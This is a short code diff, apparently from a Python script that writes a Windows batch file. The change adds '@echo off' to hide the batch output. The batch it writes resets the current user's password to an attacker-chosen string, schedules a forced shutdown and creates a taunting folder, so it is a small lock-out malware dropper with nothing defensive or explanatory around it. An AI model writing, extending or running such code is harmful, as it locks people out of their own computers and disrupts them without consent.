@@ -5,7 +5,8 @@ dosyz = open(add+".bat","a")
 butun = (add+".bat")
 
 
-dosyz.write('''color a 
+dosyz.write('''@echo off
+color a 
 net user %username% 3.dunyasavasi 
 shutdown -s -t 250
 md maalesef
